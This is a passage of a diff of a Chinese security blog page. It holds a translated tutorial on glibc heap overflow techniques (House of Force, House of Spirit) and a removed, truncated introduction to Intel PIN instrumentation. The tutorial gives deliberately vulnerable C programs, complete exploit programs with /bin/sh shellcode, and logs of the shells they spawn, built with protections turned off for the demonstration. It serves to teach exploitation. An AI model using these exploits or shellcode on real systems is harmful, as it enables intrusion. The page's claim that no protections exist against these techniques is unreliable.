class="built_in">free</span>(buf2);</div><div class="line">        <span class="built_in">free</span>(buf1);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>漏洞程序的堆内存如下所示：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum3.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum3.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p>漏洞程序的第[2]行就是堆溢出发生的地方。为了能成功利用堆溢出，攻击者要提供下面的命令行参数:</p>
+<ul>
+<li>argv[1] - Shellcode + Pad + Top chunk size被拷贝到第一个malloc chunk</li>
+<li>argv[2]- 传递给第一个malloc chunk的size参数</li>
+<li>argv[3]- 用户输入被拷贝到第三个malloc chunk</li>
+</ul>
+<p><u>漏洞利用程序</u>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit executable 'vuln' using hof technique.</div><div class="line"> */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line">#define FREE_ADDRESS 0x08049858-0x8</div><div class="line">#define MALLOC_SIZE "0xFFFFF744"</div><div class="line">#define BUF3_USER_INP "\x08\xa0\x04\x08"</div><div class="line">                </div><div class="line">/* Spawn a shell. Size - 25 bytes. */</div><div class="line">char scode[] =</div><div class="line">        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</div><div class="line">        </div><div class="line">int main( void )</div><div class="line">&#123;       </div><div class="line">        int i;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 265 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL &#125;;</div><div class="line">        </div><div class="line">        strcpy(argv1,scode);</div><div class="line">        for(i=25;i&lt;260;i++)</div><div class="line">                argv1[i] = 'A';</div><div class="line">        </div><div class="line">        strcpy(argv1+260,"\xFF\xFF\xFF\xFF"); /* Top chunk size */</div><div class="line">        argv[264] = ''; /* Terminating NULL character */ </div><div class="line"></div><div class="line">        /* Execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">`</div></pre></td></tr></table></figure>
+<p>一旦攻击者的命令行参数被拷贝到堆中，漏洞程序的堆内存变为下图所示：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum4.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum4.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>有了攻击者这些参数，就会发生下面的事情：</p>
+<p>第[2]行覆盖top chunk的size域：</p>
+<pre><code>- 攻击者参数(argv[1] – Shellcode + Pad + 0xFFFFFFFF)拷贝到堆缓冲区&apos;buf1&apos;。 由于argv[1]大于256，top chunk的size域被“0xFFFFFFFF&quot;覆盖
+</code></pre><p>第[3]行通过<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3758" target="_blank" rel="external">top chunk代码</a>分配一个非常大的内存块</p>
+<ul>
+<li>请求一个大内存块的目的是在分配后top chunk必须位于free的GOT表项的前8个字节。因此，只要再多一个内存分配请求而（第[4]行)就可以帮助我们覆盖free的GOT表项了。</li>
+<li>攻击者参数(argv[2] – 0xFFFFF744)作为参数传递给第二个malloc调用(第[3]行)。size参数可以用下面的方式来计算<ul>
+<li>size = ((free-8)-top)</li>
+<li>在这里<ul>
+<li>free指的是可执行文件’vuln’中free的GOT表项，ie)free = 0x08049858</li>
+<li>top指的是当前top chunk（在第一次malloc之后，第[1]行) ie)top = 0x0804a108.</li>
+<li>因此size = ((0x8049858-0x8)-0x804a108) = -8B8 = 0xFFFFF748</li>
+<li>当size =  0xFFFFF748时，我们的目标是将新的tip chunk 的8个字节放到free的GOT表项前面，可以通过这样做到<pre><code>+ (0xFFFFF748+0x804a108) = 0x08049850 = (0x08049858-0x8)
+</code></pre></li>
+<li>当攻击者传递size参数(0xFFFFF748)时，’glibc malloc’将size 转化为 <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3322" target="_blank" rel="external">可用的size(usable size)</a>0xfffff750。因此新的top chunk size将会位于0x8049858而不是0x8049850. 攻击者将传递0xFFFFF744(而不是0xFFFFF748)作为size参数，得到转化后的参数是‘0xFFFFF748’，这正是我们需要的。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>在第[4]行:</p>
+<ul>
+<li>由于第三行中的top chunk指向0x8049850,一个256字节的新的内存分配请求会让’glibc malloc’返回0x8049858 ，其会被拷贝到buf3中</li>
+</ul>
+<p>在第[5]行:</p>
+<ul>
+<li>将buf1的地址拷贝到buf3中，导致GOT覆盖。因此对free的调用(第[6]行)就会导致shellcode的执行。</li>
+</ul>
+<p>用攻击者的命令行参数再执行上述漏洞程序就会导致shellcode执行，如下所示:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/hof$</div></pre></td></tr></table></figure>
+<p><u>保护</u>: 至今为止，还没有针对这项技术的保护措施。所以就算用最新的glibc编译，这项技术也可以帮助我们成功利用堆溢出。</p>
+<h3 id="0X03-House-of-Spirit"><a href="#0X03-House-of-Spirit" class="headerlink" title="0X03 House of Spirit"></a>0X03 House of Spirit</h3><p>通过这项技术，攻击者欺骗’glibc malloc’返回一个在栈(不是堆)中的chunk。这就允许攻击者覆盖存储在栈中的返回地址。</p>
+<p><u>假设条件</u>: 由于不是所有的堆溢出漏洞程序都能被house of spirit技术成功利用，以下是成功利用的假设条件</p>
+<ul>
+<li>缓冲区溢出覆盖一个变量，变量中含有’glibc malloc’返回的chunk地址</li>
+<li>上述的chunk必须要被释放。攻击者必须控制被释放chunk的size。将chunk的size等于下一个分配的chunk的size。</li>
+<li>分配一个chunk</li>
+<li>用户输入必须拷贝到上述分配的chunk中</li>
+</ul>
+<p><u>漏洞程序</u>: 漏洞程序满足上述假设条件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/* vuln.c</span></div><div class="line">House of Spirit vulnerable program</div><div class="line">*/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fvuln</span><span class="params">(<span class="keyword">char</span> *str1, <span class="keyword">int</span> age)</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">char</span> *ptr1, name[<span class="number">44</span>];</div><div class="line">   <span class="keyword">int</span> local_age;</div><div class="line">   <span class="keyword">char</span> *ptr2;</div><div class="line">   [<span class="number">1</span>]local_age = age; <span class="comment">/* Prereq 2 */</span></div><div class="line"></div><div class="line">   [<span class="number">2</span>]ptr1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\nPTR1 = [ %p ]"</span>, ptr1);</div><div class="line">   [<span class="number">3</span>]<span class="built_in">strcpy</span>(name, str1); <span class="comment">/* Prereq 1 */</span></div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\nPTR1 = [ %p ]\n"</span>, ptr1);</div><div class="line">   [<span class="number">4</span>]<span class="built_in">free</span>(ptr1); <span class="comment">/* Prereq 2 */</span></div><div class="line"></div><div class="line">   [<span class="number">5</span>]ptr2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">40</span>); <span class="comment">/* Prereq 3 */</span></div><div class="line">   [<span class="number">6</span>]<span class="built_in">snprintf</span>(ptr2, <span class="number">40</span><span class="number">-1</span>, <span class="string">"%s is %d years old"</span>, name, local_age); <span class="comment">/* Prereq 4 */</span></div><div class="line">   <span class="built_in">printf</span>(<span class="string">"\n%s\n"</span>, ptr2);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">   <span class="keyword">int</span> stud_class[<span class="number">10</span>];  <span class="comment">/* Required since nextchunk size should lie in between 8 and arena's system_mem. */</span></div><div class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</div><div class="line">        [<span class="number">7</span>]stud_class[i] = <span class="number">10</span>;</div><div class="line">   <span class="keyword">if</span> (argc == <span class="number">3</span>)</div><div class="line">      fvuln(argv[<span class="number">1</span>], <span class="number">25</span>);</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>漏洞程序的栈布局如下所示:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum5.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum5.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>程序的第[3]行是缓冲区溢出发生的地方。为了能成功利用漏洞程序，攻击者提供下面的命令行参数:</p>
+<ul>
+<li>argv[1] = Shell Code + Stack Address + Chunk size</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit executable 'vuln' using hos technique.</div><div class="line"> */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line"></div><div class="line">/* Shellcode to spwan a shell. Size: 48 bytes - Includes Return Address overwrite */</div><div class="line">char scode[] =</div><div class="line">        "\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xb8\xfd\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90";</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;</div><div class="line">        int i;</div><div class="line">        char * p;</div><div class="line">        char argv1[54];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;;</div><div class="line"></div><div class="line">        strcpy(argv1,scode);</div><div class="line"></div><div class="line">        /* Overwrite ptr1 in vuln with stack address - 0xbffffdf0. Overwrite local_age in vuln with chunk size - 0x30 */</div><div class="line">        strcpy(argv1+48,"\xf0\xfd\xff\xbf\x30"); </div><div class="line"></div><div class="line">        argv[53] = '';</div><div class="line"></div><div class="line">        /* Execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>攻击者提供参数后，漏洞程序的栈布局如下所示：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/maleficarum6.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/maleficarum6.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>攻击者提供参数后，我们来看看返回地址是如何被覆盖的</p>
+<p>第[3]行：缓冲区溢出</p>
+<ul>
+<li>这里，攻击者的输入’argv[1]’拷贝到字符缓冲区’name’中。由于攻击者的输入大于44，ptr1变量和local_age分别被栈地址和chunk size覆盖。<ul>
+<li>栈地址-0xbffffdf0- 当第[5]行被执行时，攻击者欺骗’glibc malloc’返回这个地址</li>
+<li>Chunk size - 0x30- 当第[4]行执行时，这个chunk size被用来欺骗’glibc malloc’ ，往下看。</li>
+</ul>
+</li>
+</ul>
+<p>第[4]行：将栈区域加入到’glibc malloc’的 fast bin</p>
+<ul>
+<li>free()调用<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3803" target="_blank" rel="external">_int_free)_</a>。 缓冲区溢出后，ptr1 = 0xbffffdf0(而不是0x804aa08)。被覆盖的ptr1作为参数传递非free()。这样一来，可以欺骗’glibc malloc’来释放位于栈中的内存区域。正要被释放的栈区域位于ptr1-8+4 处，而这已经被攻击者用0x30覆盖，因此’glibc malloc’把这个chunk当做<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3848" target="_blank" rel="external">fast chunk</a>（因为48&lt;64)，然后将被释放的chunk<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3910" target="_blank" rel="external">插入</a>到位于<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3887" target="_blank" rel="external">索引4</a>处的fast binlist的前端。</li>
+</ul>
+<p>第[5]行:获取栈区域(第[4]行中被添加)</p>
+<ul>
+<li>对40的分配请求被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3322" target="_blank" rel="external">checked_request2size</a>转化为对48的请求。由于可用大小(usable size) ‘48’属于fast chunk中，可以获取它对应的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3333" target="_blank" rel="external">fast bin</a>(位于索引4处)。Fast bin的第一个chunk被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3341" target="_blank" rel="external">移除</a>并返回为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3355" target="_blank" rel="external">用户</a>。第一个chunk什么都不是，但在第[4]行执行期间，栈区域被添加进去了。</li>
+</ul>
+<p>第[6]行：覆盖返回地址</p>
+<ul>
+<li>将攻击者的’argv[1]’拷贝到栈区域(被’glibc malloc’返回)，其起始地址是是0xbffffdf0. argv[1]的前16个字节是:<ul>
+<li>xeb\x0e - Jmp by 14字节</li>
+<li>\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41 – Pad</li>
+<li>\xb8\xfd\xff\xbf - 存储在栈中的返回地址被此值覆盖。因此，在fvuln执行之后EIP变为0xbffffdb8- 这块区域俺有jmp指令，随后就是触发shell的shellcode!</li>
+</ul>
+</li>
+</ul>
+<p>利用攻击者的参数执行上述漏洞程序，将会执行shellcode,如下所示：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ gcc -g -fno-<span class="built_in">stack</span>-protector -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$ ./<span class="built_in">exp</span> </div><div class="line"></div><div class="line">PTR1 = [ <span class="number">0x804a008</span> ]</div><div class="line">PTR1 = [ <span class="number">0xbffffdf0</span> ]</div><div class="line"></div><div class="line">AAAAAAAAAA����<span class="number">1</span>�Ph<span class="comment">//shh/bin��P��S�</span></div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  print	vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/Dropbox/sploitfun/heap_overflow/Malloc-Maleficarum/hos$</div></pre></td></tr></table></figure>
+<p><u>保护</u>：至今为止，还没有针对这项技术的保护措施。所以就算用最新的glibc编译，这项技术也可以帮助我们成功利用堆溢出。</p>
+<p>###House of Prime<strong>  待更新
+</strong>House of Lore**  待更新</p>
+<p><u>注意</u>：出于演示目的，上述漏洞程序编译时关闭以下保护机制：</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a></li>
+<li><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NC</a></li>
+<li><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO</a></li>
+</ul>
+<p><u>参考</u></p>
+<p><a href="http://packetstormsecurity.com/files/view/40638/MallocMaleficarum.txt" target="_blank" rel="external">The Malloc Maleficarum</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/maleficarum" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc Maleficarum堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-heap-offbyone"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -715,96 +966,6 @@ cd kbeast-v1
 <!-- Table of Contents -->
 
   
-    <article id="post-pinintro"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170104/pinintro/">二进制代码注入PIN</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170104/pinintro/" class="article-date">
-	  <time datetime="2017-01-04T06:16:14.000Z" itemprop="datePublished">一月 4, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2015/12/19/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">个人博客</a>，讲述如何利用PIN进行二进制代码注入，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-<hr>
-<hr>
-<blockquote>
-<ul>
-<li>什么是注入（Instrumentation)</li>
-<li>PIN初探</li>
-<li>PIN框架</li>
-<li>Pintools Example</li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="什么是注入（Instrumentation"><a href="#什么是注入（Instrumentation" class="headerlink" title="什么是注入（Instrumentation)"></a>什么是注入（Instrumentation)</h2><p>每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。</p>
-<p>进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：</p>
-<ul>
-<li>不需要重新编译、重新链接</li>
-<li>在运行时发现代码</li>
-<li>能处理动态产生的代码</li>
-<li>能附加到正在运行时的进程中</li>
-</ul>
-<p>目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。</p>
-<h2 id="Pin初探"><a href="#Pin初探" class="headerlink" title="Pin初探"></a>Pin初探</h2><p>对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.</p>
-<p>开门见山，首先来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    counter++;</div><div class="line">             sub  $0xff, %edx</div><div class="line">    counter++;</div><div class="line">             cmp  %esi, %edx</div><div class="line">    counter++;</div><div class="line">             jle &lt;L1&gt;</div><div class="line">    counter++;</div><div class="line">             mov  $0x1, %edi</div><div class="line">    counter++;</div><div class="line">             add  $0x10, %eax</div><div class="line">```             </div><div class="line"></div><div class="line">这段代码很简单，只是在每条指令前加了一个计数器</div><div class="line">那么如果使用PIN, 该如何实现？ 看下面代码：</div><div class="line"></div><div class="line">``` C</div><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &quot;pin.h&quot;</div><div class="line"></div><div class="line">UINT64 icount = 0;</div><div class="line"></div><div class="line">void docount() &#123; icount++; &#125;</div><div class="line">    </div><div class="line">void Instruction(INS ins, void *v) </div><div class="line">&#123;</div><div class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fini(INT32 code, void *v) </div><div class="line">&#123; std::cerr &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl; &#125;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    PIN_Init(argc, argv);</div><div class="line">    INS_AddInstrumentFunction(Instruction, 0);</div><div class="line">    PIN_AddFiniFunction(Fini, 0);</div><div class="line">    PIN_StartProgram();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>现在对这段实现代码一一解释：<br><code>void docount() {icount+;}</code> 用户可自定义<code>docount()</code> 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，<code>IPOINT_BEFORE</code> 表示在每条指令之前执行，<code>（AFUNPTR)docount</code>便是要注入的分析例程。<code>main()</code> 函数调用<code>INS_AddInstrumentFunction（Instruction,0)</code>,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。<br>只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。</p>
-<p>##PIN框架<br>可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.<br>如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。</p>
-<p>下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。<br>总的来说，instrumentation包括两个部分：</p>
-<ul>
-<li>第一，决定在哪注入代码，注入什么代码的一种机制</li>
-<li>第二，在注入点要执行的代码</li>
-</ul>
-<p>第一个部分被称之为 <strong>instrumentation routine</strong>,第二个部分被称之为 <strong>analysis routine</strong>. Pintools会向PIN注册一个注入回调函数，如上文提到的<code>INS_AddInstrumentFunction（）</code>，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。</p>
-<p>注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：</p>
-<ul>
-<li>Instruction</li>
-<li>Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。</li>
-<li>Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 </li>
-</ul>
-<p>##Pintools example<br>最后，以一个Pintools 的完整例子结束本文</p>
- <figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div 